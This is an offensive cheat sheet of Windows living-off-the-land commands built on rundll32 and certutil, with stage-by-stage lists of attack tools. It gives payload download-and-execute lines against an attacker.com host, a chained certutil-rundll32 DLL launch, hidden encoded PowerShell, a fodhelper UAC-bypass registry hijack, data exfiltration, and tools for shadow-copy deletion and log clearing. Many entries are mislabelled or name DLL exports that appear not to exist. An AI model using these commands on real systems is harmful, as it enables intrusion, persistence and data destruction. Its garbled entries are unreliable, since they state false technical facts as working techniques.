
**Rundll32 Execution Techniques Cheat Sheet**
---

### ðŸ”¹ **Rundll32 Payload Execution Methods**

```
1. JavaScript/VBScript Execution via MSHTA:
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("wscript.shell.run('calc')")

2. Remote HTA Execution (SmartScreen Bypass):
   rundll32.exe url.dll,OpenURL http://attacker.com/payload.hta

3. Shellcode Invocation via ShellExecute:
   rundll32.exe shell32.dll,ShellExec_RunDLL calc.exe

4. Open Control Panel Applet:
   rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl

5. Execute DLL Export Function:
   rundll32.exe mydll.dll,ExportedFunction

6. Launch Internet Settings:
   rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl

7. UAC Popup via fodhelper:
   reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
   rundll32.exe shell32.dll,Control_RunDLL fodhelper.exe

8. Load Malicious DLL via Service Dispatcher:
   rundll32.exe advapi32.dll,StartServiceCtrlDispatcherA

9. Capture Network Share Auth:
   rundll32.exe netshell.dll,StartNetConnectionDialog 127.0.0.1

10. Trigger Scheduled Task GUI:
    rundll32.exe taskschd.dll,LaunchAdvancedTask

11. In-Memory PowerShell via JavaScript:
    rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";eval("new ActiveXObject('WScript.Shell').Run('powershell -nop -w hidden -e <base64>')")

12. DLL Sideloading (AppLocker Bypass):
    rundll32.exe .\sideload.dll,Main

13. Run Control Panel with Elevated Token:
    rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl

14. Add User via Backdoor DLL:
    rundll32.exe user32.dll,CreateUser

15. Trigger Credential UI:
    rundll32.exe keymgr.dll,KRShowKeyMgr

16. COM Object Load (DLL Hijack):
    rundll32.exe comsvcs.dll,MiniDump

17. Trigger Biometric Prompt:
    rundll32.exe biometricPrompt.dll,PromptUser

18. Load and Execute VBScript:
    rundll32.exe vbscript.dll,VBScriptMain

19. Download File via URLDownloadToFile:
    rundll32.exe urlmon.dll,URLDownloadToFileA

20. Force Group Policy Refresh:
    rundll32.exe gpedit.dll,LaunchGPE

21. Load Explorer Shell Extension:
    rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL

22. Open/Save Dialog Abuse:
    rundll32.exe comdlg32.dll,ShowOpenSaveDialog

23. CLSID Execution:
    rundll32.exe advpack.dll,LaunchINFSection

24. Registry-Redirected CLSID Execution:
    rundll32.exe dfshim.dll,ShOpenVerbApplication

25. Embedded Manifest Execution via SXS:
    rundll32.exe sxs.dll,CreateAssemblyCacheItem

26. AutoPlay Prompt Execution:
    rundll32.exe shell32.dll,SHInvokePrinterCommand

27. UNC Path Printer Dialog (Auth Capture):
    rundll32.exe printui.dll,PrintUIEntry

28. Shell Popup Lure:
    rundll32.exe shell32.dll,SHHelpShortcuts_RunDLL AddPrinter

29. Internet Explorer Shell:
    rundll32.exe ieframe.dll,LaunchBrowser

30. Network Setup Wizard:
    rundll32.exe netplwiz.dll,NetplwizRunDll

31. Windows Update Config GUI:
    rundll32.exe wuapi.dll,ShowWindowsUpdate

32. Run Disk Cleanup:
    rundll32.exe cleanmgr.dll,LaunchDiskCleanup
```

---

### ðŸ”¹ **Execution & Payload Delivery Tools**

```
- mshta.exe        â€“ Remote HTA/VBScript execution
- rundll32.exe     â€“ Memory execution of DLLs & JS-based COM
- regsvr32.exe     â€“ Remote script/DLL execution
- powershell.exe   â€“ Fileless payload & script execution
- msiexec.exe      â€“ Remote MSI execution
- cmd.exe          â€“ Generic command execution
- wscript.exe / cscript.exe â€“ JS/VBS script execution
- certutil.exe     â€“ Payload download & encoding utilities
```

---

### ðŸ”¹ **Persistence & Scheduled Execution**

```
- schtasks.exe     â€“ Create persistent scheduled tasks
- wmic.exe         â€“ Remote & scheduled execution
- eventvwr.exe     â€“ UAC bypass via registry hijack
- fodhelper.exe    â€“ Auto-elevated UAC bypass
```

---

### ðŸ”¹ **Privilege Escalation & Credential Access**

```
- dllhost.exe      â€“ COM/DLL hijacking
- slui.exe         â€“ UAC bypass vector
- sdclt.exe        â€“ Arbitrary code exec with escalation
- taskmgr.exe      â€“ Malicious DLL injection
```

---

### ðŸ”¹ **Lateral Movement Tools**

```
- psexec.exe       â€“ Remote command execution
- winrm.vbs        â€“ PowerShell remoting helper
- wmic.exe         â€“ Remote process spawning
```

---

### ðŸ”¹ **Impact â€“ Data Destruction / Anti-Forensics**

```
- cipher.exe       â€“ File deletion and disk wipe
- vssadmin.exe     â€“ Shadow copy deletion
- wbadmin.exe      â€“ Delete backups
- bcdedit.exe      â€“ Disable recovery
- wevtutil.exe     â€“ Clear event logs
- shutdown.exe     â€“ Reboot system
- fsutil.exe       â€“ Filesystem manipulation
```

---

### ðŸ”¹ **Certutil Abuse Techniques**

```
1. Download via HTTP:
   certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe

2. Encode to Base64:
   certutil -encode payload.exe payload.txt

3. Decode from Base64:
   certutil -decode payload.txt payload.exe

4. View Cert Store:
   certutil -store My

5. Extract Public Key:
   certutil -store -user My > pubkey.pem

6. Add Dummy Cert to Root Store:
   certutil -user -addstore Root dummycert.cer

7. Dump CRL:
   certutil -url dummycert.cer

8. Encode PowerShell Script:
   certutil -encode script.ps1 encoded.txt

9. Sign INF File:
   certutil -addstore TrustedPublisher malicious.cer

10. Verify Payload Signature:
    certutil -verify payload.exe

11. LOLBAS Download:
    certutil -urlcache -split -f http://attacker.com/evil.ps1 evil.ps1

12. Convert Cert to Base64:
    certutil -encode cert.cer cert_base64.txt

13. Convert Base64 to Cert:
    certutil -decode cert_base64.txt cert_decoded.cer

14. AV Evasion via Random File:
    certutil -generateSSTFromWU legitfile.sst

15. Download via UNC:
    certutil -urlcache -split -f \\attacker\share\payload.exe payload.exe

16. Validate Cert Chain:
    certutil -urlfetch -verify malicious.exe

17. Dump System Store:
    certutil -user -store -enterprise

18. Harvest Certs from Users:
    certutil -user -store -pfx

19. Ping via Time-Based Exfil:
    certutil -urlcache -f http://attacker.com/`date /t`

20. Sign Payload:
    certutil -sign payload.exe signer.cer signed_payload.exe

21. Overwrite Trusted Root Store:
    certutil -addstore -enterprise -f Root attackerCA.cer

22. List CA Trust:
    certutil -viewstore -enterprise CA

23. Enumerate Smart Card Certs:
    certutil -scinfo

24. Side-Channel via Revocation Check:
    certutil -verify -urlfetch malicious.cer

25. View Root CAs:
    certutil -store root

26. List Templates:
    certutil -template

27. Rename via Encode/Rename:
    certutil -encode malware.exe newname.txt && ren newname.txt malware.exe

28. Encode Dropper:
    certutil -encode dropper.ps1 encoded.txt

29. Decode Obfuscated Payload:
    certutil -decode encoded_payload.txt stage2.exe

30. Combine with Rundll32:
    certutil -urlcache -split -f http://evil/payload.dll && rundll32 payload.dll,Entry

31. Persist Cert for UAC Bypass:
    certutil -addstore Root persist.cer

32. Bypass Detection via ADS:
    certutil -urlcache -split -f http://attacker.com/evil.exe C:\temp\legit.exe:evil
```

